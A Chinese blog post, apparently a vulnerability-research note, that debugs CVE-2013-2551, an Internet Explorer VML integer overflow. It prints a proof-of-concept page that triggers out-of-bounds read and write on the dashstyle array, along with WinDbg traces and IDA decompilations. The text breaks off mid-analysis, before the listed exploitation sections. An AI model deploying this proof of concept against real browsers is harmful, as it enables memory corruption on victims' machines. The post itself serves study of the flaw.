<!-- build time:Thu Oct 17 2019 11:46:19 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="IE整数溢出漏洞[cve-2013-2551]分析"><meta name="keywords" content="堆利用,IE,整数溢出"><meta name="author" content="Hpasserby"><meta name="copyright" content="Hpasserby"><title>IE整数溢出漏洞[cve-2013-2551]分析 | Hpasserby</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?4e3b4e0b100ec31631e29622d1ef8014";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>!function(e,t,a,n,c,s,o){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,s=t.createElement(a),o=t.getElementsByTagName(a)[0],s.async=1,s.src=n,o.parentNode.insertBefore(s,o)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-136221440-1","auto"),ga("send","pageview")</script><link rel="dns-prefetch" href="http://ta.qq.com"><script>!function(){var t=document.createElement("script");t.src="https://tajs.qq.com/stats?sId=66194231";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}()</script><script>var GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容:${query}"}},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"}}</script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#调试环境"><span class="toc-number">1.</span> <span class="toc-text">调试环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POC调试"><span class="toc-number">2.</span> <span class="toc-text">POC调试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#触发漏洞"><span class="toc-number">2.1.</span> <span class="toc-text">触发漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞根源"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞根源</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞利用分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息泄露"><span class="toc-number">3.1.</span> <span class="toc-text">信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关代码"><span class="toc-number">3.1.1.</span> <span class="toc-text">相关代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调试笔记"><span class="toc-number">3.1.2.</span> <span class="toc-text">调试笔记</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#劫持eip"><span class="toc-number">3.2.</span> <span class="toc-text">劫持eip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关代码-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">相关代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调试笔记-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">调试笔记</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-number">3.3.</span> <span class="toc-text">ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#布置payload"><span class="toc-number">3.3.1.</span> <span class="toc-text">布置payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#栈转移"><span class="toc-number">3.3.2.</span> <span class="toc-text">栈转移</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#相关代码-2"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">相关代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析"><span class="toc-number">3.3.2.2.</span> <span class="toc-text">代码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rop链"><span class="toc-number">3.3.3.</span> <span class="toc-text">rop链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#相关代码-3"><span class="toc-number">3.3.3.1.</span> <span class="toc-text">相关代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#代码分析-1"><span class="toc-number">3.3.3.2.</span> <span class="toc-text">代码分析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#完整利用"><span class="toc-number">4.</span> <span class="toc-text">完整利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/images/avatar.jpg"></div><div class="author-info__name text-center">Hpasserby</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/Hpasserby/Hpasserby.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">19</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">19</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">4</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友情链接</div><a class="author-info-links__name text-center" href="http://eax.life/">我eax大哥</a><a class="author-info-links__name text-center" href="https://redogwu.github.io/">wjllz师傅</a><a class="author-info-links__name text-center" href="https://hachp1.github.io/">HACHp1大佬</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image:url(/images/head.jpg)"><div id="page-header"><span class="pull-left"><a id="site-name" href="/">Hpasserby</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/about">关于</a></span></div><div id="post-info"><div id="post-title">IE整数溢出漏洞[cve-2013-2551]分析</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-03</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/browser/">browser</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><blockquote><p>调试的第二个洞，深刻的体会到了自己调试功底有多弱，在写这篇笔记的时候才理清调试思路。。。<br>这个洞说是整数溢出，我感觉主要还是在整数溢出造成的越界访问上。<br><a id="more"></a></p></blockquote><p><img src="/post/ef2727d8/pwn.gif" alt="pwn.gif"></p><h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul><li>windows7 32位(IE版本: 8.0.7600.16385)</li><li>windbg</li><li>Immunity Debugger<blockquote><p>这个洞在win8 + IE10下依然可以触发并利用</p></blockquote></li></ul><h1 id="POC调试"><a href="#POC调试" class="headerlink" title="POC调试"></a>POC调试</h1><p><strong>poc代码：</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"x-ua-compatible"</span> <span class="attr">content</span>=<span class="string">"IE=EmulateIE9"</span> &gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>POC by VUPEN<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">v\: * &#123; behavior:url(#default#VML); display:inline-block &#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">xml:namespace</span> <span class="attr">ns</span>=<span class="string">"urn:schemas-microsoft-com:vml"</span> <span class="attr">prefix</span>=<span class="string">"v"</span> /&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"createRects(); exploit();"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">v:oval</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">v:stroke</span> <span class="attr">id</span>=<span class="string">"vml1"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">v:oval</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">		var rect_array = new Array()</span></span><br><span class="line"><span class="undefined">		var a = new Array()</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="undefined">		function createRects()&#123;</span></span><br><span class="line"><span class="undefined">			for(var i=0; i&lt;0x400; i++)&#123;</span></span><br><span class="line"><span class="undefined">				rect_array[i]    = document.createElement("v:shape")</span></span><br><span class="line"><span class="undefined">				rect_array[i].id = "rect" + i.toString()</span></span><br><span class="line"><span class="undefined">				document.body.appendChild(rect_array[i])</span></span><br><span class="line"><span class="undefined">			&#125;</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="undefined">		function exploit()&#123;	</span></span><br><span class="line"><span class="undefined">			var vml1  = document.getElementById("vml1")</span></span><br><span class="line"><span class="undefined">			</span></span><br><span class="line"><span class="undefined">			for (var i=0; i&lt;0x400; i++)&#123;</span></span><br><span class="line"><span class="undefined">				a[i] = document.getElementById("rect" + i.toString())._vgRuntimeStyle;  //获取_vgRuntimeStyle属性</span></span><br><span class="line"><span class="undefined">			&#125;</span></span><br><span class="line"><span class="undefined">			</span></span><br><span class="line"><span class="undefined">			for (var i=0; i&lt;0x400; i++)&#123;</span></span><br><span class="line"><span class="undefined">				a[i].rotation;  //第一次访问rotation属性，创建COARuntimeStyle对象 大小为0xAC(0xB0) 在偏移为0x58处为marginLeft</span></span><br><span class="line"><span class="undefined">				if (i == 0x300) &#123;   //在COARuntimeStyle中间创建一个包含44个元素的dashstyle数组（ORG数组），分配4*44 = 0xb0大小的空间</span></span><br><span class="line"><span class="undefined">				vml1.dashstyle = "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"</span></span><br><span class="line"><span class="undefined">				&#125;</span></span><br><span class="line"><span class="undefined">			&#125;</span></span><br><span class="line"><span class="undefined">			</span></span><br><span class="line"><span class="undefined">			vml1.dashstyle.array.length = 0 - 1;   //整数溢出</span></span><br><span class="line"><span class="undefined">			</span></span><br><span class="line"><span class="undefined">			for (var i=0; i&lt;0x400; i++)   &#123;     </span></span><br><span class="line"><span class="undefined">				a[i].marginLeft = "hpasserby";  //设置marginLeft的值，用于判断该对象是否紧接在dashstyle（ORG数组）之后。</span></span><br><span class="line"><span class="undefined">				marginLeftAddress = vml1.dashstyle.array.item(0x2E+0x16);</span></span><br><span class="line"><span class="undefined">				if (marginLeftAddress &gt; 0) &#123;</span></span><br><span class="line"><span class="undefined">					vml1.dashstyle.array.item(0x2E+0x16) = 0x41414141;</span></span><br><span class="line"><span class="undefined">				&#125;</span></span><br><span class="line"><span class="undefined">			&#125;</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><h2 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h2><p>首先开启HPA选项，在上一篇博客中提到过</p><blockquote><p><code>gflag.exe -i iexplore.exe +hpa</code></p></blockquote><p>使用windbg进行调试，程序中断在以下位置<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">(d14.e8c): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=1a53f064 ebx=6acc4964 ecx=00000001 edx=00000000 esi=1a53f060 edi=0463be4c</span><br><span class="line">eip=766c9966 esp=0463be08 ebp=0463be10 iopl=0         nv up ei ng nz ac pe cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010297</span><br><span class="line">msvcrt!memcpy+0x158:</span><br><span class="line">766c9966 8b448efc        mov     eax,dword ptr [esi+ecx*4-4] ds:0023:1a53f060=????????</span><br><span class="line">0:005&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0463be10 6ac6cfa9 0463be4c 1a53f060 00000004 msvcrt!memcpy+0x158</span><br><span class="line">0463be24 6acbda0f 1b1d2fe8 0463be4c 00000044 vgx!ORG::Get+0x27</span><br><span class="line">0463be50 764a3ec3 1b1d2fe8 00000044 0463beb4 vgx!COALineDashStyleArray::get_item+0x8c</span><br><span class="line">0463be70 764a3d3d 1b3daff0 00000024 00000004 OLEAUT32!DispCallFunc+0x165</span><br><span class="line">0463bf00 6aca47c1 08829454 1b3daff0 00000000 OLEAUT32!CTypeInfo2::Invoke+0x23f</span><br><span class="line">0463c08c 6acc4a88 1b3daff4 1b3daff0 6ace223c vgx!COADispatch::Invoke+0x89</span><br><span class="line">0463c0c0 68c3db38 1b3daff0 00000000 68c30adc vgx!COADispatchImpl&lt;IVgDashStyleArray,&amp;IID_IVgDashStyleArray,COAShapeProg&gt;::Invoke+0x2f</span><br><span class="line">0463c100 68c3da8c 092ecd10 00000000 00000409 jscript!IDispatchInvoke2+0xf0</span><br><span class="line">0463c13c 68c3d9ff 092ecd10 00000409 00000003 jscript!IDispatchInvoke+0x6a</span><br><span class="line">0463c1fc 68c3db8a 092ecd10 00000000 00000003 jscript!InvokeDispatch+0xa9</span><br></pre></td></tr></table></figure><p></p><p>可以看到，crash的原因是访问了非法内存，查看该内存附近区域<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd 1a53f060-100 l50</span><br><span class="line">1a53ef60  00000005 00000006 00000007 00000008</span><br><span class="line">1a53ef70  00000009 0000000a 0000000b 0000000c</span><br><span class="line">1a53ef80  0000000d 0000000e 0000000f 00000010</span><br><span class="line">1a53ef90  00000011 00000012 00000013 00000014</span><br><span class="line">1a53efa0  00000015 00000016 00000017 00000018</span><br><span class="line">1a53efb0  00000019 0000001a 0000001b 0000001c</span><br><span class="line">1a53efc0  0000001d 0000001e 0000001f 00000020</span><br><span class="line">1a53efd0  00000021 00000022 00000023 00000024</span><br><span class="line">1a53efe0  00000025 00000026 00000027 00000028</span><br><span class="line">1a53eff0  00000029 0000002a 0000002b 0000002c</span><br><span class="line">1a53f000  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f010  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f020  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f030  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f040  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f050  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f060  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f070  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f080  ???????? ???????? ???????? ????????</span><br><span class="line">1a53f090  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure><p></p><p>可以注意到在所访问的非法内存前面，存在一串极其规律的数字，结合POC中的代码，我们发现这应该是dashstyle属性的值，这是一个数组，其中每个元素大小为4字节。<br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vml1.dashstyle = <span class="string">"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"</span></span><br></pre></td></tr></table></figure><p></p><p>继续结合POC，发现下面这句对dashstyle数组的访问应该就是造成crash的原因了<br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">marginLeftAddress = vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>);</span><br></pre></td></tr></table></figure><p></p><p>其中<code>0x2E+0x16</code>正好是访问的非法内存地址相对于数组的偏移。这意味着，我们拥有了数组越界访问的能力。<br>但是，漏洞的成因我们还是不得而知，观察函数调用栈，向上回溯到vgx!ORG::Get，在函数开始处下上断点。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0:015&gt; bp vgx!ORG::Get</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 7 hit</span><br><span class="line">eax=1b570fe8 ebx=70a84964 ecx=70a17258 edx=0449bfb4 esi=1b778ff0 edi=0449c55c</span><br><span class="line">eip=70a2cf82 esp=0449bf90 ebp=0449bfb8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vgx!ORG::Get:</span><br><span class="line">70a2cf82 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd esp l4</span><br><span class="line">0449bf90  70a7da0f 1b570fe8 0449bfb4 00000044</span><br><span class="line">0:005&gt; dd 1b570fe8 l8                               </span><br><span class="line">1b570fe8  70a17258 002cffff 00040004 00000101</span><br><span class="line">1b570ff8  1a7dcf50 d0d0d0d0 ???????? ????????</span><br><span class="line">0:005&gt; ln 70a17258                                  //查看对象虚表</span><br><span class="line">(70a17258)   vgx!ORG::`vftable&apos;   |  (70a172e8)   vgx!vrgopNinch</span><br><span class="line">Exact matches:</span><br><span class="line">    vgx!ORG::`vftable&apos; = &lt;no type information</span><br></pre></td></tr></table></figure><p></p><p>配合IDA查看该函数结构<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__stdcall ORG::Get(<span class="keyword">int</span> a1, <span class="keyword">void</span> *Dst, <span class="keyword">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( Dst )</span><br><span class="line">    result = <span class="built_in">memcpy</span>(Dst, (*(a1 + <span class="number">16</span>) + a3 * (*(a1 + <span class="number">8</span>) &amp; <span class="number">0xFFFF</span>)), *(a1 + <span class="number">8</span>) &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>根据第一个参数的虚表指针可以知道到，<code>a1</code>是一个<code>vgx!ORG</code>对象，<code>*(a1+16)</code>是<code>dashstyle</code>数组的起始地址。从而可以得知，<code>dashstyle</code>属性是靠<code>vgx!ORG</code>对象进行管理的。<br>第三个参数<code>a3</code>则是所访问的元素的偏移，正好是<code>0x2e+0x16=0x44</code></p><p>然而，按照程序执行正常流程来说，是不应该调用到这个函数的，越界访问应该提前被检查到，所以我们还需要继续向前回溯，在<code>vgx!COALineDashStyleArray::get_item</code>处下断点，同时配合IDA。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __stdcall COALineDashStyleArray::get_item(struct COAProg **<span class="keyword">this</span>, <span class="keyword">signed</span> <span class="keyword">int</span> a2, <span class="keyword">int</span> *a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">COAProg</span> **<span class="title">v3</span>;</span> <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">COAProg</span> *<span class="title">v6</span>;</span> <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line">  ...</span><br><span class="line">      <span class="keyword">if</span> ( a2 &lt;= <span class="number">-1</span> || (v8 = (*(*<span class="keyword">this</span> + <span class="number">11</span>))(<span class="keyword">this</span>), a2 &gt;= v8) )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="number">0x80048230</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">        (*(*<span class="keyword">this</span> + <span class="number">7</span>))(<span class="keyword">this</span>, &amp;v10, a2); <span class="comment">//vgx!ORG::Get</span></span><br><span class="line">        *a3 = v10;</span><br><span class="line">      &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">0:015&gt; bp vgx!COALineDashStyleArray::get_item</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 7 hit</span><br><span class="line">eax=0000000a ebx=70a84964 ecx=70a7d983 edx=184eaff2 esi=018baea0 edi=0473c2f4</span><br><span class="line">eip=70a7d983 esp=0473bd54 ebp=0473bd70 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">vgx!COALineDashStyleArray::get_item:</span><br><span class="line">70a7d983 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd esp l4</span><br><span class="line">0473bd54  764a3ec3 1b398ff0 00000044 0473bdb4</span><br></pre></td></tr></table></figure><p>通过调试，确定ida代码中调用的两个函数指针分别为<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v8 = (*(*<span class="keyword">this</span> + <span class="number">11</span>))(<span class="keyword">this</span>)      <span class="comment">//vgx!ORG::CElements()</span></span><br><span class="line">(*(*<span class="keyword">this</span> + <span class="number">7</span>))(<span class="keyword">this</span>, &amp;v10, a2); <span class="comment">//vgx!ORG::Get(int a1, void *Dst, int a3)</span></span><br></pre></td></tr></table></figure><p></p><p>观察参数可以知道，<code>a2</code>是将要访问的偏移。<br>注意到在IDA中的if判断，首先调用了<code>ORG::CElements</code>，若其返回值小于<code>a2</code>，则执行<code>vgx!ORG::Get</code>函数<br>直觉告诉我们这里便是一个关键点所在，我们跟进<code>ORG::CElements</code>函数查看细节。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">vgx!ORG::CElements:</span><br><span class="line">70a2d079 8bff            mov     edi,edi</span><br><span class="line">70a2d07b 55              push    ebp</span><br><span class="line">70a2d07c 8bec            mov     ebp,esp</span><br><span class="line">70a2d07e 8b4508          mov     eax,dword ptr [ebp+8]</span><br><span class="line">70a2d081 0fb74004        movzx   eax,word ptr [eax+4]</span><br><span class="line">70a2d085 5d              pop     ebp</span><br><span class="line">70a2d086 c20400          ret     4</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0:005&gt; g</span><br><span class="line">eax=1b190fe8 ebx=70a84964 ecx=70a17258 edx=0473bd24 esi=1b398ff0 edi=0473c2f4</span><br><span class="line">eip=70a2d07e esp=0473bd2c ebp=0473bd2c iopl=0         nv up ei pl nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213</span><br><span class="line">vgx!ORG::CElements+0x5:</span><br><span class="line">70a2d07e 8b4508          mov     eax,dword ptr [ebp+8] ss:0023:0473bd34=1b190fe8</span><br><span class="line">0:005&gt; dd 1b190fe8 l8</span><br><span class="line">1b190fe8  70a17258 002cffff 00040004 00000101</span><br><span class="line">1b190ff8  1a3fcf50 d0d0d0d0 ???????? ????????</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=1b190fe8 